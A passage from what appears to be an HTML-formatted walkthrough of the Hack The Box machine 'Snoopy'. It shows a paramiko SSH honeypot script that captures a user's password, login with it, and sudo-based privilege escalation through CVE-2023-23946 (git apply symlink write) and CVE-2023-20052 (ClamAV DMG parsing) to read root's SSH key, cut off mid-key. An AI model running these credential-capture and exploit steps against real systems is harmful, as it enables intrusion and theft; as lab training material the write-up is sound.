+&lt;img src=&quot;/assets/img/ctf/data/snoopy-32.png&quot; alt=&quot;snoopy-32.htb&quot; /&gt;
+&lt;em&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://mm.snoopy.htb/devsecops/channels/it-support&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;But somehow, empty:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-33.png&quot; alt=&quot;snoopy-33.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looking for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt;-commands we see the following:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-34.png&quot; alt=&quot;snoopy-34.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/server-provision&lt;/code&gt;:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-35.png&quot; alt=&quot;snoopy-35.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Clicking on &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Operating System&lt;/code&gt; we see:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Windows - TCP/5985 (Disabled)&lt;/code&gt; &lt;em&gt;and&lt;/em&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Linux - TCP/2222&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Curious to what happens I set the IP address to my own and startet a netcat listener on port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2222&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 2222
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 2222 ...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After sending we receive a request:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.219] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.129.229.5] 56118
+SSH-2.0-paramiko_3.1.0
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And we received a new message from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cbrown@snoopy.htb&lt;/code&gt;:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-36.png&quot; alt=&quot;snoopy-36.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;We gotta setup an ssh server on port 2222 to see what’s happening. Maybe start an ssh honeypot on port 2222 and capture credentials if there are any:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;pipx &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;paramiko &lt;span class=&quot;nt&quot;&gt;--include-deps&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;sh&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;&apos; &amp;gt; ssh_honeypot.py
+import socket
+import sys
+import threading
+import paramiko
+
+# Dynamically generate an RSA key for the host identification
+HOST_KEY = paramiko.RSAKey.generate(2048)
+
+class CredentialLogger(paramiko.ServerInterface):
+    def __init__(self, client_ip):
+        self.client_ip = client_ip
+
+    def check_auth_password(self, username, password):
+        print(f&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;======== 🔥 LOOTED PASSWORD FROM {self.client_ip} ========&quot;)
+        print(f&quot;Username: {username}&quot;)
+        print(f&quot;Password: {password}&quot;)
+        print(&quot;======================================================&quot;)
+        return paramiko.AUTH_FAILED  # Fail it so they try other combos or stop cleanly
+
+    def check_auth_publickey(self, username, key):
+        print(f&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;======== 🔑 LOOTED PUBLIC KEY FROM {self.client_ip} ========&quot;)
+        print(f&quot;Username: {username}&quot;)
+        print(f&quot;Key Type: {key.get_name()}&quot;)
+        print(f&quot;Base64:   {key.get_base64()[:50]}...&quot;)
+        print(&quot;======================================================&quot;)
+        return paramiko.AUTH_FAILED
+
+    def get_allowed_auths(self, username):
+        return &quot;password,publickey&quot;
+
+def handle_client(client_socket, addr):
+    try:
+        transport = paramiko.Transport(client_socket)
+        transport.add_server_key(HOST_KEY)
+        server = CredentialLogger(addr[0])
+        transport.start_server(server=server)
+    except Exception as e:
+        pass
+
+def main():
+    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    
+    try:
+        server_socket.bind((&apos;0.0.0.0&apos;, 2222))
+    except Exception as e:
+        print(f&quot;[!] Bind failed: {e}&quot;)
+        sys.exit(1)
+        
+    server_socket.listen(10)
+    print(&quot;[*] Custom SSH Honeypot listening on 0.0.0.0:2222...&quot;)
+
+    while True:
+        client_socket, addr = server_socket.accept()
+        t = threading.Thread(target=handle_client, args=(client_socket, addr))
+        t.daemon = True
+        t.start()
+
+if __name__ == &quot;__main__&quot;:
+    main()
+&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;EOF
+
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python3 ./ssh_honeypot.py
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Custom SSH Honeypot listening on 0.0.0.0:2222...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now resend the request and see what our ssh honeypot says:&lt;/p&gt;
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;======== 🔥 LOOTED PASSWORD FROM 10.129.229.5 ========
+Username: cbrown
+Password: sn00pedcr3dential!!!
+======================================================
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;HERE WE GO!! WE CAPTURED CBROWN’S CREDENTIALS BABY!!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh cbrown@snoopy.htb
+The authenticity of host &lt;span class=&quot;s1&quot;&gt;&apos;snoopy.htb (10.129.229.5)&apos;&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;&apos;t be established.
+ED25519 key fingerprint is: SHA256:XCYXaxdk/Kqjbrpe8gktW9N6/6egnc+Dy9V6SiBp4XY
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &apos;&lt;/span&gt;snoopy.htb&lt;span class=&quot;s1&quot;&gt;&apos; (ED25519) to the list of known hosts.
+cbrown@snoopy.htb&apos;&lt;/span&gt;s password:&amp;lt;sn00pedcr3dential!!!&amp;gt;
+Welcome to Ubuntu 22.04.2 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 5.15.0-71-generic x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Documentation:  https://help.ubuntu.com
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Management:     https://landscape.canonical.com
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not log into.
+
+To restore this content, you can run the &lt;span class=&quot;s1&quot;&gt;&apos;unminimize&apos;&lt;/span&gt; command.
+cbrown@snoopy:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;HERE WE GO!!!&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;-31-privilege-escalation-cbrown---sbrown&quot;&gt;📈 3.1 Privilege Escalation (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cbrown&lt;/code&gt; -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sbrown&lt;/code&gt;)&lt;/h2&gt;
+
+&lt;p&gt;Looking at what &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cbrown&lt;/code&gt; can execute as root we see &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/git&lt;/code&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cbrown@snoopy:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;cbrown:
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;cbrown on snoopy:&amp;lt;sn00pedcr3dential!!!&amp;gt;
+    env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin, mail_badpass
+
+User cbrown may run the following commands on snoopy:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;sbrown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; PASSWD: /usr/bin/git ^apply &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;a-zA-Z0-9.]+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That looks sus to me. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git apply&lt;/code&gt; itself stands in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;gtfobins&lt;/code&gt; but without the strict regex. Let’s dig further.&lt;/p&gt;
+
+&lt;p&gt;Looking at the git version we see it’s v2.34.1&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cbrown@snoopy:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
+git version 2.34.1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;After searching for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;git apply security issue&lt;/code&gt; I came across this:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-37.png&quot; alt=&quot;snoopy-37.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I also found &lt;a href=&quot;https://www.rapid7.com/db/vulnerabilities/redhat_linux-cve-2023-23946/&quot;&gt;this&lt;/a&gt;. Which looks like a vulnerability in git which allows arbitrary file write via a symlink. Seems very interesting, we have to try it out!&lt;/p&gt;
+
+&lt;p&gt;To exploit this vulnerability (CVE-2023-23946), we first have to create a git repo and create a symlink to sbrown’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.ssh/&lt;/code&gt; directory. As we want to write our own &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;authorized_hosts&lt;/code&gt; file we have to make sure that this file will be readable by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sbrown&lt;/code&gt; otherwise our attack is wasted.&lt;/p&gt;
+
+&lt;p&gt;For this, I have created an exploit you can find &lt;a href=&quot;https://github.com/tralsesec/CVE-2023-23946&quot;&gt;here&lt;/a&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cbrown@snoopy:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./exp.sh
+Enter the target directory to symlink &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g., /home/sbrown/.ssh&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: /home/sbrown/.ssh
+Enter the filename to create inside that directory &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g., authorized_keys&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: authorized_keys
+Enter the file content / payload &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Press CTRL+D when finished&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFKsKkyQkLwlH3Gh1Q1nSd5NKcJzg39oeW/D7S+L84Wu tralsesec@omarchy
+hint: Using &lt;span class=&quot;s1&quot;&gt;&apos;master&apos;&lt;/span&gt; as the name &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the initial branch. This default branch name
+hint: is subject to change. To configure the initial branch name to use &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;all
+hint: of your new repositories, which will suppress this warning, call:
+hint:
+hint: 	git config &lt;span class=&quot;nt&quot;&gt;--global&lt;/span&gt; init.defaultBranch &amp;lt;name&amp;gt;
+hint:
+hint: Names commonly chosen instead of &lt;span class=&quot;s1&quot;&gt;&apos;master&apos;&lt;/span&gt; are &lt;span class=&quot;s1&quot;&gt;&apos;main&apos;&lt;/span&gt;, &lt;span class=&quot;s1&quot;&gt;&apos;trunk&apos;&lt;/span&gt; and
+hint: &lt;span class=&quot;s1&quot;&gt;&apos;development&apos;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; The just-created branch can be renamed via this &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;:
+hint:
+hint: 	git branch &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &amp;lt;name&amp;gt;
+Initialized empty Git repository &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /tmp/cve_git_patch/.git/
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] SUCCESS: Repository setup &lt;span class=&quot;nb&quot;&gt;complete &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; /tmp/cve_git_patch
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] exploit.patch has been generated with your custom inputs.
+
+To trigger the exploit, execute the following &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;as the target user:
+
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/cve_git_patch &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; sbrown /usr/bin/git apply &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; exploit.patch
+
+cbrown@snoopy:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp/cve_git_patch &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; sbrown /usr/bin/git apply &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; exploit.patch
+Checking patch symlink &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; renamed-symlink...
+Checking patch renamed-symlink/authorized_keys...
+Applied patch symlink &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; renamed-symlink cleanly.
+Applied patch renamed-symlink/authorized_keys cleanly.
+cbrown@snoopy:/tmp/cve_git_patch&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-38.png&quot; alt=&quot;snoopy-38.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;CASH:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; ~/.ssh/id_ed25519 sbrown@snoopy.htb
+Enter passphrase &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;key &lt;span class=&quot;s1&quot;&gt;&apos;/home/tralsesec/.ssh/id_ed25519&apos;&lt;/span&gt;:
+Welcome to Ubuntu 22.04.2 LTS &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GNU/Linux 5.15.0-71-generic x86_64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Documentation:  https://help.ubuntu.com
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Management:     https://landscape.canonical.com
+ &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that &lt;span class=&quot;nb&quot;&gt;users &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;not log into.
+
+To restore this content, you can run the &lt;span class=&quot;s1&quot;&gt;&apos;unminimize&apos;&lt;/span&gt; command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+sbrown@snoopy:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;user.txt
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;REDACTED]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/snoopy-39.png&quot; alt=&quot;snoopy-39.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Here we go!&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;-32-privilege-escalation-sbrown---root&quot;&gt;📈 3.2 Privilege Escalation (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sbrown&lt;/code&gt; -&amp;gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;)&lt;/h2&gt;
+
+&lt;p&gt;As &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sbrown&lt;/code&gt; we look for what we can execute as root:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sbrown@snoopy:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;sbrown on snoopy:
+    env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET&quot;&lt;/span&gt;, env_keep+&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH&quot;&lt;/span&gt;, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin, mail_badpass
+
+User sbrown may run the following commands on snoopy:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/bin/clamscan ^--debug /home/sbrown/scanfiles/[a-zA-Z0-9.]+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;clamscan&lt;/code&gt; is a tool by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ClamAV&lt;/code&gt; which is an AntiVirus Product for Linux Systems. It makes sense why we should be able to execute it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; but what if the version is vulnerable? Let’s find out:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sbrown@snoopy:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;clamscan &lt;span class=&quot;nt&quot;&gt;--version&lt;/span&gt;
+ClamAV 1.0.0/26853/Fri Mar 24 07:24:11 2023
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;I don’t know about you - I don’t play all day everyday with ClamAV. But &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ClamAV 1.0.0&lt;/code&gt; seems VERY old in my eyes, it HAS to have some CVEs. Online I find &lt;a href=&quot;https://github.com/nokn0wthing/CVE-2023-20052&quot;&gt;this&lt;/a&gt;:
+&lt;img src=&quot;/assets/img/ctf/data/snoopy-40.png&quot; alt=&quot;snoopy-40.htb&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Somehow didn’t work perfectly. So I wrote my own exploit that you can find &lt;a href=&quot;https://github.com/tralsesec/CVE-2023-20052&quot;&gt;here&lt;/a&gt;:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;git clone https://github.com/tralsesec/CVE-2023-20052 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;CVE-2023-20052 &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt; +x ./exploit.sh &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  ./exploit.sh
+File to &lt;span class=&quot;nb&quot;&gt;read&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;e.g. /etc/passwd or /root/.ssh/id_rsa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: /root/.ssh/id_rsa
+Cloning into &lt;span class=&quot;s1&quot;&gt;&apos;./libdmg-hfsplus-source&apos;&lt;/span&gt;...
+remote: Enumerating objects: 5511, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+remote: Counting objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;309/309&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+remote: Compressing objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;68/68&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+remote: Total 5511 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 270&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, reused 241 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;delta 241&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, pack-reused 5202 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;from 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Receiving objects: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;5511/5511&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, 30.56 MiB | 5.12 MiB/s, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Resolving deltas: 100% &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2310/2310&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;tralsesec:
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Building 5.9s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;19/19&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; FINISHED
+
+&amp;lt;SNIP&amp;gt;
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Generated exploit.dmg successfully.
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now upload that to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/sbrown/scanfiles/exploit.dmg&lt;/code&gt; and execute:&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;clamscan &lt;span class=&quot;nt&quot;&gt;--debug&lt;/span&gt; /home/sbrown/scanfiles/exploit.dmg
+
+&amp;lt;SNIP&amp;gt;
+
+LibClamAV debug: cli_scandmg: wanted blkx, text value is blkx-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
